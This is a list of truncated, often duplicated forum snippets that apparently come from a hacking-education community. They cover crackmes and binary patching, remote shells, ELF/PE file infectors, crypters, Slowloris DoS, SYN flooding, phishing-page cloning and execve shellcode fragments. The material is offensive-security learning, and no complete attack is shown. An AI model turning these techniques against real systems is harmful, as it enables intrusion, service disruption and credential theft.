"Thanks  \u2026 I would suggest to start a topic with a poll: Windows, Linux, Both, ??", "Yes, I\u2019ll respect that . Would be interesting to know how much use Win and how much use Linux here on the board\u2026", "Hey Mates, in the last days I announced a realistic challenge for you. I worked hard, so here is a real challenge for you. If you stuck at some point you can search in the hints section for some help . Description of the RE ChallengeThis time you have a step-by-step challenge, which can\u2019t be solv&hellip;", "Anything that does not require a Windows Box would be fine!", "C or C++ would be great!", "Reverse engineering the whole thing is quite a task, even for this small program. And I fully agree\u2026 vim is really cool", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "I forgot to say, It\u2019s looks like je to jmp binary representation not correct. Because if I\u2019m changing 0x74 to 0xbf I\u2019m get error something like \u2018Segmentation fault\u2019. So I\u2019ve found some table assembly opcodes with their binary representation, where jmp represented with 0xeb and this works for me.", "Good catch @JaCube. It was indeed a mistake. I\u2019m glad to see people around that first try to solve the problem before starting to ask like crazy. Well done!", "I forgot to say, It\u2019s looks like je to jmp binary representation not correct. Because if I\u2019m changing 0x74 to 0xbf I\u2019m get error something like \u2018Segmentation fault\u2019. So I\u2019ve found some table assembly opcodes with their binary representation, where jmp represented with 0xeb and this works for me.", "The function itself is very simple\u2026 Looking forward to your solutions", "I\u2019ll try to reverse the password but it might be a bit harder for me since I haven\u2019t really touched 64-bit assembly.", "I\u2019ll try to reverse the password but it might be a bit harder for me since I haven\u2019t really touched 64-bit assembly.", "So far, looks like only @dtm has provided a solution the my little challenger (not really a surprise ) . He also gave us a couple of hints on how to find a solution. I have already given a couple of hints as well in the comments but, in case you haven\u2019t manage to solve it and you are wondering how t&hellip;", "The above links are an interesting read for those who are/will be Computer Science students.", "The love stage went away many years ago\u2026", "The love stage went away many years ago\u2026", "Nice tutorial! Today I\u2019m done this thanks to your tutorial and this is perfect experience. Yesterday I\u2019m tried to find password, but not successful. But I\u2019m not understand. Is there some password? Or it\u2019s can be done with patch only?", "It is. If you want to try, it is ABCDEFG. You can try to reverse the obfuscate function works and obtain the key, instead of cracking the program. That usually requires more effort that just breaking the check\u2026 that computationally speaking is simpler.", "The love stage went away many years ago\u2026", "So far, looks like only @dtm has provided a solution the my little challenger (not really a surprise ) . He also gave us a couple of hints on how to find a solution. I have already given a couple of hints as well in the comments but, in case you haven\u2019t manage to solve it and you are wondering how t&hellip;", "So far, looks like only @dtm has provided a solution the my little challenger (not really a surprise ) . He also gave us a couple of hints on how to find a solution. I have already given a couple of hints as well in the comments but, in case you haven\u2019t manage to solve it and you are wondering how t&hellip;", "yeah definitely worthy of some attention. you gotta love the RFCs.", "I think you need SOCKS4a or SOCK5 to support UDP: However, there is a negotiation going on between the client and the server. Apparently that is done over a normal TCP connection (not fully sure), but in any case, in order to bind an UDP port you need to interchange information with the server an&hellip;", "What about a power brick transformer type deal?", "So far, looks like only @dtm has provided a solution the my little challenger (not really a surprise ) . He also gave us a couple of hints on how to find a solution. I have already given a couple of hints as well in the comments but, in case you haven\u2019t manage to solve it and you are wondering how t&hellip;", "Looks like it would be tough to fit all that stuff in there! It would probably require to build an ad-hoc GSM board", "I saw it on mine as well. Looks really cool! I think a computer power cable would be a cool disguise", "I think you need SOCKS4a or SOCK5 to support UDP: However, there is a negotiation going on between the client and the server. Apparently that is done over a normal TCP connection (not fully sure), but in any case, in order to bind an UDP port you need to interchange information with the server an&hellip;", "Yeah. But maybe if you were doing some thing UDP, spoofing the IP from a proxy? I don\u2019t think any normal socks proxy would allow that kind of control though.", "Hmm. I\u2019ll look into it.", "That\u2019s a snazzy idea. I found you can use the  servers at koding.com for a similar use. Of course setting up your account behind a VPN.", "This just popped in my twitter, and it looks like something interesting for the kindof forgotten HW section. http://samy.pl/keysweeper/#sn It is based on an Arduino, a GSM modem and a small NRF board for the wireless sniffing. All that packed in a standard USB charger case. All the code is availab&hellip;", "Yeah. But maybe if you were doing some thing UDP, spoofing the IP from a proxy? I don\u2019t think any normal socks proxy would allow that kind of control though.", "You are the best @dtm!!! How would you qualify the difficulty level?..", "Hmm. I\u2019ll look into it.", "A Perl Server  #!/usr/bin/perl use IO::Socket::INET; $| = 1; $socket = new IO::Socket::INET ( LocalPort =&gt; \u201813378\u2019, Proto =&gt; \u2018tcp\u2019, Listen =&gt; 5, Reuse =&gt; 1 ) or die \u201cCannot create server socket\u201d; $c = $socket-&gt;accept(); $c-&gt;recv($data, 1024); # This is not really needed $c-&gt;send(\u201c1\u201d); $c-&gt;&hellip;", "A Perl Server  #!/usr/bin/perl use IO::Socket::INET; $| = 1; $socket = new IO::Socket::INET ( LocalPort =&gt; \u201813378\u2019, Proto =&gt; \u2018tcp\u2019, Listen =&gt; 5, Reuse =&gt; 1 ) or die \u201cCannot create server socket\u201d; $c = $socket-&gt;accept(); $c-&gt;recv($data, 1024); # This is not really needed $c-&gt;send(\u201c1\u201d); $c-&gt;&hellip;", "This just popped in my twitter, and it looks like something interesting for the kindof forgotten HW section. http://samy.pl/keysweeper/#sn It is based on an Arduino, a GSM modem and a small NRF board for the wireless sniffing. All that packed in a standard USB charger case. All the code is availab&hellip;", "I\u2019m not that great, honestly. It was pretty easy for me because I had some prior experience with this sort of thing. I haven\u2019t explored enough of RE to develop an understanding of the range of difficulty for challenges.", "I\u2019m not that great, honestly. It was pretty easy for me because I had some prior experience with this sort of thing. I haven\u2019t explored enough of RE to develop an understanding of the range of difficulty for challenges.", "Hey 0x00sec people! Not long ago, I said I would put up some source code for Dijkstra\u2019s Algorithm. Today, I\u2019ll be showing you just one way to do it. We\u2019ll be utilizing an Adjacency Matrix, which is simply a 2D Array. As we progress, each implementation will be more efficient than the last. Taking a&hellip;", "*Opens up radare2*Hehe, looks fun ^^", "You are the best @dtm!!! How would you qualify the difficulty level?..", "Solution to the original code: Binary patching: After extracting the ELF binary, open it up in a disassemblerPerform a strings analysis and locate any obvious strings\u2019 position(s) in the executable codeFind the conditional \u2018jz\u2019 instruction and patch it with an unconditional jmp, i.e. bytes 74 &hellip;", "OK, strings does not work on this one. I did it on purpose as I think everybody will know how to do that by now. In this case, it is better to use the second dump (the one with symbols). This one contains the symbols, so you can see the libc functions called by the application. You can approach the&hellip;", "This just popped in my twitter, and it looks like something interesting for the kindof forgotten HW section. http://samy.pl/keysweeper/#sn It is based on an Arduino, a GSM modem and a small NRF board for the wireless sniffing. All that packed in a standard USB charger case. All the code is availab&hellip;", "This just popped in my twitter, and it looks like something interesting for the kindof forgotten HW section. http://samy.pl/keysweeper/#sn It is based on an Arduino, a GSM modem and a small NRF board for the wireless sniffing. All that packed in a standard USB charger case. All the code is availab&hellip;", "This just popped in my twitter, and it looks like something interesting for the kindof forgotten HW section. http://samy.pl/keysweeper/#sn It is based on an Arduino, a GSM modem and a small NRF board for the wireless sniffing. All that packed in a standard USB charger case. All the code is availab&hellip;", "In general, you cannot spoof your ip and use a standard proxy. Normal proxies requires the client to establish a full connection and that is not possible when you spoof your IP, unless you are in a local network (where you can sniff the traffic) or the proxy is running a 15 years old operating syste&hellip;", "I believe that if a machine gets a wrong packet it will respond with a RST, terminating the connection. I\u2019m not fully sure, it has been a while since I do not have to go that down in the TCP/IP stack. In that case, you have to be sure that you are spoofing an off-line machine so it will not send th&hellip;", "Well it becomes problematic when it\u2019s connection based indeed. I meant as a comment to pry0cc, the synflooder. You can spoof the IP then.", "Hello! So the other night I tried to learn some more about the Slow-Loris style of DOS attack. I couldn\u2019t tell you much about EXACTLY how the original slow-loris.pl worked, but here\u2019s what I found to be effective against an Apache2. I figured I\u2019d go through the process of what I did to share some of&hellip;", "OK, strings does not work on this one. I did it on purpose as I think everybody will know how to do that by now. In this case, it is better to use the second dump (the one with symbols). This one contains the symbols, so you can see the libc functions called by the application. You can approach the&hellip;", "Thanks. @pry0cc. I haven\u2019t realize that I could have use this to trojanize all your computers . Let\u2019s see if the second binary (this is also safe, just a bit bigger) and hint helps to crack it! Thanks again for checking and trusting", "I\u2019m sorry. I don\u2019t know how I am supposed to do this? I am literally a total binary/debugging noob. I ran strings on the generated binary from the base64, but that didn\u2019t really help me. Any pointers? I need you to be really explicit. SORRY FOR THE N00BISHNESS.", "This runs on my machine, If it wasn\u2019t you that posted it, I don\u2019t think I would\u2019ve run it. Running a random binary with no source is kind of scary xD As for cracking it, I have no idea where to start.", "A little help\u2026 A version without symbols stripped + a hint Hint: Look for strncmp NEW CODEH4sIACu8RFcAA+1Zf3RTVx2/Lz/a0EJe9kMFmZIhaJEtNNp56ATWsKS9kYyVrR0CgyzNjzaSHzV9DwqDjS6U7S1EOR7dYUfPRJ06PR6HcyJDDqQU+mPTURhuTOZkuM2EoJThaMewz++9776QPInHP/zHc3yH13vv537v98fn+733vTwednkadRyH1EuHFiEycnINdNzA8GcsB&hellip;", "Hi Everybody! Inspired by @TheDoctor I started working in a small side project involving some crackme\u2019s, and I would appreciate your feedback/comments (if the binary works on your system, how easy/difficult you found the challenger,\u2026) The program is encoded at the end of this post. To get the bina&hellip;", "Hey Mates, in the last post I mentioned to maybe make a bigger challenge, which I think I\u2019ll publish within the next days. Today I got a little introduction to Client/Server cracking because this will be extremely important for realistic exercises. In most of the cases your password/license is test&hellip;", "A Perl Server  #!/usr/bin/perl use IO::Socket::INET; $| = 1; $socket = new IO::Socket::INET ( LocalPort =&gt; \u201813378\u2019, Proto =&gt; \u2018tcp\u2019, Listen =&gt; 5, Reuse =&gt; 1 ) or die \u201cCannot create server socket\u201d; $c = $socket-&gt;accept(); $c-&gt;recv($data, 1024); # This is not really needed $c-&gt;send(\u201c1\u201d); $c-&gt;&hellip;", "Hi Everybody! Inspired by @TheDoctor I started working in a small side project involving some crackme\u2019s, and I would appreciate your feedback/comments (if the binary works on your system, how easy/difficult you found the challenger,\u2026) The program is encoded at the end of this post. To get the bina&hellip;", "Hi Everybody! Inspired by @TheDoctor I started working in a small side project involving some crackme\u2019s, and I would appreciate your feedback/comments (if the binary works on your system, how easy/difficult you found the challenger,\u2026) The program is encoded at the end of this post. To get the bina&hellip;", "Hi Everybody! Inspired by @TheDoctor I started working in a small side project involving some crackme\u2019s, and I would appreciate your feedback/comments (if the binary works on your system, how easy/difficult you found the challenger,\u2026) The program is encoded at the end of this post. To get the bina&hellip;", "Hello homies and homets! PySec/Airth here coming at you with some 1337 subnetting. This article was originally posted on Null Byte but since I joined the 0x00sec team and there are a ton of new comers, I decided to re-upload some of them so people won\u2019t get confused with the rest of the posts I will&hellip;", "That is a very good site. Challengers starts simple and become quite advanced in the higher levels!", "My solution: Deobfuscate the C# executable.Find the class which contains the main method.Recognize that the string is parsed as individual elements (element int_0 of the key of length 1) with the following method: private static int smethod_1(string string_0, int int_0) { return int.Parse(st&hellip;", "Hey Mates, as I said in my last post we\u2019re coming to license key cracking. Note: I also said to make a challenge about nag removing but I think I cancel this because it\u2019s just too easy (Think of a program with a message box at start; just remove the MessageBox() in code\u2026). When we come to C++ this &hellip;", "That is a very good site. Challengers starts simple and become quite advanced in the higher levels!", "The link below is a website that includes exploit exercises. Just had a look at it and it seems interesting. I hope you will like it. https://exploit-exercises.com/", "That reminds me, I should reupload the VIM tutorial", "Nice tut! You can just type :wq to save (write) and leave (q) vi, without typing any file name. Even if you want to change the file name, you can just type :w filename.", "That reminds me, I should reupload the VIM tutorial", "Somebody requested we have a spoiler tag, so that we can hide infomation for challenges and such. Your wish has been granted! [spoiler] Hello world! [/spoiler] now makes   Hello world! , and you just click it to reveal whats underneath the blur. It also works with images. Enjoy!", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Nice @TheDoctor! I see the difference!", "Nice @TheDoctor! I see the difference!", "Hey Mates, we have again some time, so we accept another challenge! Why? Because we can! Ok, enough motivation speech for now; let\u2019s come to the introduction. This time I just reused the program I made last time (Yep, I\u2019m a lazy guy ) but with a slightly difference: Obfuscation. I talked from time&hellip;", "Congrat @n3xUs!!! Great Job!", "I am so pleased for you @n3xUs! Good job man! As for 1 month. That is truly awesome! I never thought this would take off like it has!", "Alright: This w33k, this honor is awarded to @n3xUs, for his articles on Social Engineering. Keep it up, buddy. You can see who has gotten 1337 of the w33k by checking out its badge. We\u2019ve been here for a month!Today, 5/21/16 marks one month of 0x00sec! Can you remember how it all was a month ago&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Great first post cr1ms0n1r1s! I\u2019m looking forward to the advances in AI based infosec. Here is an article briefly describing some experimental antivirus software that utilizes deep learning to identify and prevent malware.", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Stay strong buddy!", "I\u2019m looking forward to it. Hope your assignments went/are going well! I think I will be in a similar situation soon\u2026", "Stay strong buddy!", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "I\u2019m looking forward to it. Hope your assignments went/are going well! I think I will be in a similar situation soon\u2026", "I\u2019m trying to finish my subnetting series. Currently writing an article on VLSM  I apologize for my lack of uploads, I\u2019ve just been busy with a ton of university assignments unfortunately.", "I\u2019m trying to finish my subnetting series. Currently writing an article on VLSM  I apologize for my lack of uploads, I\u2019ve just been busy with a ton of university assignments unfortunately.", "Well done! , and youve saved me the time of posting on writing a proxy in python! (which i may still do for those non c users.) Also, well noted on the nmap through proxychains as i failed to specify it requires a full connect scan  oops. Nice read, well written. I may play with your code a bit in&hellip;", "I didn\u2019t know\u2026 That makes the comment a lot more valuable. I\u2019m missing your network posts", "I\u2019m PySec by the way, in case you didn\u2019t know", "@Airth is correct, You truly are on fire! This again is absolute gold! I am so pleased you are in our community, you are such a valuable asset!", "Thank you! I wanted to cover this and other more extensive cracking ways when we come to C++ (Ok, it sounds a bit weird to say more extensive when speaking about 1 command, but I hope you know what I mean ;)).", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Thank you! I wanted to cover this and other more extensive cracking ways when we come to C++ (Ok, it sounds a bit weird to say more extensive when speaking about 1 command, but I hope you know what I mean ;)).", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Thanks I started this some time ago, and it looked like a good moment to share it following the user view we\u2019ve got yesterday. Unfortunately I will be busy with other projects in the coming weeks so it will be difficult to post these long tutorials", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "You are on fire mate.", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Nice post! Just to let you know. The program works great on GNU/Linux using mono. For a case like this, were the password has not been obfuscated at all, you can just try: string -e l file.exe", "Thanks for the catch on the code. It\u2019s fixed!", "I personally use this, i just figured for anyone new to vim, using the spelled out :save and /filename would allow them to \u201csee\u201d what was going on, as opposed to anyone who blindly follows a guide without learning would end up using :wq not  knowing what it does. Just because those people do exist.", "Nice tut! You can just type :wq to save (write) and leave (q) vi, without typing any file name. Even if you want to change the file name, you can just type :w filename.", "That is indeed possible, at the end you are just reading/writing and moving around bytes in a file. I went quickly through @dtm code and I haven\u2019t see any specific Windows code, except the types definitions\u2026 But I may have olverlooked something.", "Or, you know, you could join the #nanomasterrace", "True that. When I figured out I could do that for the first time I freaked out", "Nice tut! You can just type :wq to save (write) and leave (q) vi, without typing any file name. Even if you want to change the file name, you can just type :w filename.", "Nice tut! You can just type :wq to save (write) and leave (q) vi, without typing any file name. Even if you want to change the file name, you can just type :w filename.", "Hey 0x00sec! I\u2019ll be taking a pause from my Data Structures series to introduce this community to Graph Theory with Dijkstra\u2019s Algorithm. I only just barely understand this, so bare with me. Graph Theory (Brief)There are two main types of graphs: Directed Graphs are graphs whose edges go a cert&hellip;", "Hello everyone of 0x00! I figured why not make my first contribution, so heres a quick one  Today, im going to brush the topic of proxies, followed by how to set up ProxyChains to make being tracked a bit harder. So first things first. What is a proxy? In computer networks, a proxy server is a s&hellip;", "Alternate Title: Picking Up Women: For Hackers.", "That is indeed possible, at the end you are just reading/writing and moving around bytes in a file. I went quickly through @dtm code and I haven\u2019t see any specific Windows code, except the types definitions\u2026 But I may have olverlooked something.", "Thanks for the catch on the code. It\u2019s fixed!", "I\u2019ll be reading this a few times \u2013 to grasp it. BTW: There\u2019s a bug in your first snippet: You passed fsize twice, rather than passing fsize1 the second time.", "I guess so. May main interest on these topic was to patch or update applications when the source code is not available or dealing with legacy system. But yes\u2026 a binary patching system and a malware works pretty much the same way  Thanks", "Such an amazing article man! Keep it up!!!", "Woah, why did I never tried this. Basicly this is just Linux malware right? This is so awesome, thanks for opening my eyes &lt;3 Fuck Windows Internals, I\u2019m gonna focus on this ^^. Amazing article! unh0lys0da", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Oh right. Okay. I was talking more about backdooring windows applications, using Linux. However I am exited to see your tutorial!", "I believe ELF is not derived from COFF, however, concepts as segments, libraries or relocation are required and, on one way or another, reflected in the format. @pry0cc with some data definitions, it will be possible to compile it on Linux and run it to infect PE executables\u2026 but it will not work o&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "I believe ELF is not derived from COFF, however, concepts as segments, libraries or relocation are required and, on one way or another, reflected in the format. @pry0cc with some data definitions, it will be possible to compile it on Linux and run it to infect PE executables\u2026 but it will not work o&hellip;", "The infector will point to the last section of the PE file and attempt to locate a code cave which is big enough to house the shellcode. There is a limitation on potential targets which I did forget to mention. For this example, since the MessageBoxA function resides within user32.dll, it will only&hellip;", "Okay, 0x00sec people! Now for insert(...). I expect this to be the last technical part of the Linked List subseries before a fairly significant code dump. Algorithm DescriptionOur insertion function takes two parameters: T val and const size_t&amp; idx. T val is a value of type T (remember, I like t&hellip;", "Hello everyone, Our IRC channel is #0x00sec on irc.0x00sec.org. Join us there! Fingerprints: SHA512 Fingerprint=9A:8E:74:82:CE:54:48:36:42:4D:A3:82:27:B8:ED:0E:78:6D:16:11:E2:62:0B:AE:1C:15:63:4B:58:A1:96:A8:E5:B5:34:0C:9E:52:4F:37:24:B3:E0:C2:49:3F:F4:06:B7:AD:8D:96:48:4D:3E:2C:98:F6:83:6E:0F:&hellip;", "Welcome, to a guide on crypters and their technology. I\u2019ve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of black magic, something that\u2019s quite obscure in terms of being able to find information and do research. Of course, it has become ver&hellip;", "Congratulations!.. Well done! You guys have done a great job bringing this up and the way you are managing it is awesome!. Keep the great job!", "Yeah that C program is definitely an abuse of fors.", "Yeah that C program is definitely an abuse of fors.", "Congratulations!.. Well done! You guys have done a great job bringing this up and the way you are managing it is awesome!. Keep the great job!", "We did it! 100 users!Hello 0x00\u2019ers! A couple of weeks ago, this community started off as a fun new place to teach, learn and discuss Infomation Security, following the swift decline in activity at Nullbyte. Between three humble hackers on the #nullbyte IRC channel; Me, @oaktree and @unh0lys0da wor&hellip;", "Congratulations!.. Well done! You guys have done a great job bringing this up and the way you are managing it is awesome!. Keep the great job!", "We did it! 100 users!Hello 0x00\u2019ers! A couple of weeks ago, this community started off as a fun new place to teach, learn and discuss Infomation Security, following the swift decline in activity at Nullbyte. Between three humble hackers on the #nullbyte IRC channel; Me, @oaktree and @unh0lys0da wor&hellip;", "A Perl version using a lookup table, and featuring the use of last  #!/usr/bin/perlsub raw_input{ print $_[0]; $a=&lt;&gt;; chomp($a);return $a;}@d = ((16,0), (20,1.15), (26,1.05), (200, .9));$base = 1000;$n = raw_input (&quot;Please enter the number of driver in your family :&quot;);for ($i = 0, $j = 1; $&hellip;", "import java.util.Scanner;class ChallengeTwo {    private final int baseInsurance = 1000;    private int numDrivers;    private String driverName;    private int driverAge;        public ChallengeTwo() {            }        public static void main (String[] args) {        ChallengeTwo ct&hellip;", "May have bugs, but they seem to work. A Perl version #!/usr/bin/perlsub print_staircase{  for ($i = 0; $i &lt; $_[0] + 1; $i++)  {    printf &quot;%*s&quot;, $_[0] + 1, (&quot;#&quot; x $i) . &quot;\\n&quot;;  }}print_staircase(6);As a one-liner function sub print_staircase{for($i=0;$i&lt;$_[0]+1;$i++){printf &quot;%*s&quot;,$_[0]+&hellip;", "Hello there all, today we will be discussing packet forging. There are some uses for packet forging including (D)DOS\u2019ing, spoofing, MiTM attacks and way more that don\u2019t come to mind at the moment. While this may sound like a very difficult subject it is actually quite simple. Basicly it\u2019s just cop&hellip;", "What Is Bogo Sort?Bogo Sort is a sorting algorithm that is not used in production at all. Why? Because it\u2019s extremely stupid. Some even call it \u201cStupid Sort.\u201d The algorithm works by generating random permutations of an inputted array-to-sort. Then, it checks to see if the randomly generated permut&hellip;", "Hello Hackers ! Welcome to this my new tutorial ( or at least sharing some tips ) . Here you will learn how to use Netcat and what is Netcat. Netcat is the swiss army knife for hacker and network administrator. If you want to test a simple server/client app that you programmed in your favorite lan&hellip;", "Hello 0x00sec people! This next part of my series is about delete(...). Basic Algorithm Descriptiondelete(...) will remove a node at a certain index in a linked list. It takes one parameter of type const size_t&amp; idx. Basically, it takes in a number corresponding to a certain node in the list, if w&hellip;", "SET is great when you have a short space of time at hand, however sometimes you want to know whats actually going on under the hood or have found a site you can\u2019t clone with SET. Step 1: Select Your Target!The First Thing You\u2019re Going to Want to Do Is Select the Site Login You Wish to Clone! For T&hellip;", "Here\u2019s an exercise for you programming enthusiasts like myself. Good Luck! ( : I wrote this while on toilet and I enjoy the look of this emoji, TMI?) A small insurance company asks you to create a program to determine the cost of automobile insurance premium for each family member, based on their a&hellip;", "for i in range(int(raw_input(&quot;Please enter the number of drivers in your family: &quot;))): print(&quot;The amount of insurance for &quot;+raw_input(&quot;Driver &quot;+str(i+1)+&quot; name: &quot;)+&quot;: $&quot;+str(str([1150 if (16 &lt;= age &lt;= 19) else ( 1050 if (20 &lt;= age &lt;= 25) else ( 900 if age &gt; 25 else 0)) for age in [int(raw_input(&quot;Dri&hellip;", "def print_staircase(length): print &quot;\\n&quot;.join([str(&quot;#&quot;*i).rjust(length) for i in range(length+1)])E: Now actually a function.", "The Task: Implement a function that will print out a staircase of desired length. Example: If I call some function print_staircase(6), I should get something like this:      #    ##   ###  #### ###########Tips:The language you use is your choice.Think about spacing.This activity is &hellip;", "Nope you were right after all, dup2 doesn\u2019t seem to be possible  I\u2019m continuing this journey", "Well done @0x00pf Keep it up! I look forward to seeing more of your content.", "Nope you were right after all, dup2 doesn\u2019t seem to be possible  I\u2019m continuing this journey", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "Well done @0x00pf Keep it up! I look forward to seeing more of your content.", "Yes I already got to that part and got the client side encrypted. However setting up the server side is a whole different story it seems. I found good documentation on the server side lacking and am currently researching. This is the reason I decided to learn OpenSSL from the ground up. I\u2019ll try thr&hellip;", "Congrats mate! Glad ya got it!", "Well deserved! I hope to keep learning with your articles!", "Congratulations @0x00pf !", "Well done mate! You deserve it! Your contributions are really top notch!", "Congrats mate! Glad ya got it!", "Yes I already got to that part and got the client side encrypted. However setting up the server side is a whole different story it seems. I found good documentation on the server side lacking and am currently researching. This is the reason I decided to learn OpenSSL from the ground up. I\u2019ll try thr&hellip;", "As far as I understood how it works, you indeed have a socket at the very end to send/receive the data through the network, but it looks like OpenSSL works on top of the the socket. According to the examples I checked, you need to call BIO/SSL_write and BIO/SSL_read to crypt and decrypt. I think th&hellip;", "So it turns out, we have support for Polls! To make a poll all you need to do is insert this code [poll]- Awesome- Super Awesome[/poll]And it makes this. So. What do you think of this feature? AwesomeSuper Awesome0voters Show results", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "dup2 does work, you can use BIO/SSL_get_fd and BIO/SSL_set_fd", "Congratulations @0x00pf !", "Well done mate! You deserve it! Your contributions are really top notch!", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "Thanks for checking\u2026 Yep, I understood the point. It was just another example", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "Thanks a lot @oaktree and the rest of the staff. I really appreciate this recognition! Glad yo hear you like the series.", "Hello 0x00sec community! It is once again time for the announcement of 1337 of the w33k. 1337 of the w33k is a recognition of excellence in contributing to 0x00sec. Every week, the staff gets together to nominate their choice for this award. The acknowledgement is complemented by a special badge. &hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "True\u2026 OpenSSL is not easy and the documentation is not the best either. Regarding the forking I have to check but I think you have to use the openSSL functions to read/write crypt data. I do not think that just a dup2 will work.", "Woah no trouble at all  I\u2019ve just checked it and there seems to go something wrong with the string /bin//sh It seems a delimiter get\u2019s added between the pushes. (Trying to figure out why). Another method is using a short jump. global _start_start:jmp short stuffreturn:pop rdixor rax, rax(&hellip;", "It is in the text segment and the address is read directly from the beginning of the text segment. A pop will not work. I wrote to try the RIP-relative addressing mode on the x64\u2026 as a shellcode it needs  tweak\u2026 It has a null at the beginning", "These two should be the other way around like so: stuff:call returndb &#39;/bin/sh&#39;, 0This pushes the string onto the stack because whenever a call is used, the address of the next instruction within db &#39;/bin/sh&#39;, 0 gets pushed as the return value.", "Woah this one is pretty, msg is on the stack right? then pop/lea it in rdi? also the add al, 0x3b was cool", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "OpenSSL is more complex then I thought. I was trying to do a copy-pasta, no clue how it works version, but it was no good. Currently learning the OpenSSL protocol. If I use OpenSSL, I don\u2019t need the fork and childprocess right?", "i\u2019ve tried to start the shell this way to, and works perfectly but calling it from the stack is the point\u2026", "No your english is great! It\u2019s the pure complexity that I think the reason why Oaktree will have to re-read this a few times! I think I will have to re-read this a few times myself!", "Thanks everybody for the positive feedback!", "Intel Programming Manuals http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html", "I had learn a lot from those. What every programmer should know about memory, Part 1  (the rest of the parts are linked at the end of the article, just before the comments) What Every Computer Scientist Should Know About Floating-Point Arithmetic 